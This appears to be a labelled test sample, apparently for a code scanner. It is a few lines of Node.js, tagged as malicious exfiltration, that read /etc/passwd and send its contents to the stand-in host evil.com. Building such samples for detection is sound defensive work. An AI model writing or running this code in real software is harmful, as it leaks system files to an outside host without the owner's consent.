// codesure: MALICIOUS exfiltration
const fs = require('fs');
const https = require('https');
const data = fs.readFileSync('/etc/passwd', 'utf8');
https.get('https://evil.com/upload?d=' + encodeURIComponent(data));
